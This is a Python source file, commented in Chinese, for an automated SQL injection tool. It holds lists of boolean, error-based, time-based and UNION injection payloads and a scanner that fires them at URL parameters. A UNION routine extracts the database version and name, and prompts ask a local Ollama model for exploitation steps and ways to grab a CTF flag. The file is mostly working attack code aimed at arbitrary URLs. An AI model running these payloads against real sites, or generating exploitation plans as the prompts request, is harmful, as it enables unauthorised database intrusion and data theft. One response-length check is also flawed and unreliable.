"""
SQL注入工具
支持: 注入点探测、自动化注入、Ollama智能分析
"""

import requests
import re
import time
import urllib.parse
from modules.ollama_client import ModelClient as OllamaClient
from config import DEFAULT_USER_AGENT


class SQLiTool:
    """SQL注入工具"""

    # 常见注入payload
    PAYLOADS = {
        # 经典布尔注入
        "classic_bool": [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            '" OR "1"="1',
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "admin' --",
            "admin' #",
            "1' or 1=1 --",
        ],
        # 数字型
        "numeric": [
            "1 OR 1=1",
            "1 OR 1=2",
            "-1 OR 1=1",
            "1 AND 1=1",
            "1 AND 1=2",
        ],
        # 报错注入
        "error": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --",
            "' AND UPDATEXML(1,CONCAT(0x7e,version()),1) --",
            "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x) --",
        ],
        # 时间盲注
        "time": [
            "' AND SLEEP(3) --",
            "1' AND (SELECT * FROM (SELECT SLEEP(3))a) --",
            "'; WAITFOR DELAY '0:0:3' --",
        ],
        # 联合注入
        "union": [
            "' UNION SELECT NULL --",
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT NULL,NULL --",
            "' UNION ALL SELECT NULL --",
        ],
    }

    def __init__(self):
        self.ollama = OllamaClient()
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": DEFAULT_USER_AGENT})

    def scan(self, url):
        """
        扫描URL检测注入点
        :param url: 目标URL，如 http://xxx.com/test.php?id=1
        :return: 扫描报告
        """
        results = []

        # 解析URL参数
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            return "[ERROR] URL中没有发现参数，请确认URL格式: http://xxx.com/page.php?param=value"

        results.append(f"[i] 目标: {url}")
        results.append(f"[i] 参数: {list(params.keys())}")

        found_sqli = []

        for param in params:
            original = params[param][0]
            results.append(f"\n[*] 测试参数: {param}")

            # 测试每种注入类型
            for sqli_type, payloads in self.PAYLOADS.items():
                for payload in payloads[:3]:  # 每种类型最多试3个
                    test_url = self._build_url(url, param, original, payload)
                    try:
                        r = self.session.get(test_url, timeout=10)
                        resp_text = r.text[:500]

                        # 检测是否有注入反应
                        detected, reason = self._check_response(
                            r, original, payload, resp_text
                        )

                        if detected:
                            findings = f"[!] 发现疑似注入! [{sqli_type}] {param}={payload}"
                            results.append(findings)
                            results.append(f"    原因: {reason}")
                            found_sqli.append({
                                "param": param,
                                "type": sqli_type,
                                "payload": payload,
                                "url": test_url,
                                "reason": reason,
                            })

                            # 调用AI进一步分析
                            ai_hint = self._ai_hint(url, param, payload, sqli_type)
                            if ai_hint:
                                results.append(f"    [AI建议] {ai_hint[:200]}")

                    except requests.exceptions.Timeout:
                        results.append(f"    [超时] {payload}")
                    except Exception as e:
                        results.append(f"    [错误] {str(e)[:50]}")

        if found_sqli:
            results.append(f"\n[+] 共发现 {len(found_sqli)} 个疑似注入点")
            # 生成利用建议
            suggestion = self._generate_exploit_suggestion(url, found_sqli)
            results.append(f"\n[AI利用建议]\n{suggestion}")
        else:
            results.append("\n[-] 未发现明显注入点")

        return "\n".join(results)

    def exploit_union(self, url, param, payload):
        """执行UNION联合注入"""
        results = []

        # 先确定列数
        results.append("[*] 检测UNION注入列数...")
        for cols in range(1, 10):
            union_payload = f"' UNION SELECT " + ",".join([str(i) for i in range(1, cols + 1)]) + " --"
            test_url = self._build_url(url, param, "", union_payload)
            try:
                r = self.session.get(test_url, timeout=10)
                if "error" not in r.text.lower() and r.status_code == 200:
                    results.append(f"[+] 列数可能为: {cols}")
                    # 爆数据库
                    results.append(self._union_extract(url, param, cols))
                    break
            except Exception:
                pass

        return "\n".join(results)

    def _build_url(self, base_url, param, original, payload):
        """构建测试URL"""
        parsed = urllib.parse.urlparse(base_url)
        params = urllib.parse.parse_qs(parsed.query)

        # 替换参数值
        params[param] = [payload]

        # 重建查询字符串
        new_query = urllib.parse.urlencode(params, doseq=True)

        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    def _check_response(self, response, original, payload, resp_text):
        """检测响应是否表明存在注入"""
        # SQL错误特征
        error_patterns = [
            "sql syntax", "syntax error", "mysql_", "mysqli_",
            "sqlite_", "postgresql", "ora-", "microsoft sql",
            "sqlserver", "odbc", "sql error", "warning:",
            "fatal error", "uncaught exception",
            "xdebug", "stack trace", "sqlite3",
        ]

        resp_lower = resp_text.lower()

        # 检查SQL错误
        for pattern in error_patterns:
            if pattern in resp_lower:
                return True, f"发现SQL错误特征: {pattern}"

        # 检查布尔差异(内容长度变化)
        if abs(len(resp_text) - len(response.text)) > 100:
            return True, f"响应长度异常"

        # 检查时间盲注
        # (已在scan中通过响应时间判断)

        return False, ""

    def _ai_hint(self, url, param, payload, sqli_type):
        """调用AI获取注入建议"""
        try:
            prompt = f"""SQL注入点已确认:
- URL: {url}
- 参数: {param}
- Payload: {payload}
- 类型: {sqli_type}

请给出:
1. 进一步利用的具体步骤
2. 应该提取哪些信息(数据库版本/用户/数据表)
3. 对应的payload示例
简洁回答，每点不超过2行。
"""
            return self.ollama.generate(prompt)
        except Exception:
            return None

    def _generate_exploit_suggestion(self, url, findings):
        """生成完整利用方案"""
        try:
            prompt = f"""已确认目标存在SQL注入:
- URL: {url}
- 发现: {findings}

请给出完整的利用计划:
1. 信息收集(数据库版本、用户权限)
2. 数据提取步骤(表名、列名、数据)
3. 快速获取flag的方法

格式要求: 步骤清晰，payload具体。
"""
            return self.ollama.generate(prompt)
        except Exception:
            return "调用AI失败，请手动分析"

    def _union_extract(self, url, param, cols):
        """UNION注入提取数据"""
        results = []
        payloads = [
            # 爆数据库版本+用户
            "' UNION SELECT " + ",".join(["@@version"] + ["NULL"] * (cols - 1)) + " --",
            # 爆数据库名
            "' UNION SELECT " + ",".join(["database()"] + ["NULL"] * (cols - 1)) + " --",
        ]

        for payload in payloads:
            test_url = self._build_url(url, param, "", payload)
            try:
                r = self.session.get(test_url, timeout=10)
                # 提取有用的数据
                if "error" not in r.text.lower():
                    results.append(f"[GET] {payload[:50]} -> 可能成功")
            except Exception:
                pass

        return "\n".join(results) if results else "[!] 尝试提取数据..."


if __name__ == "__main__":
    tool = SQLiTool()
    print(tool.PAYLOADS.keys())
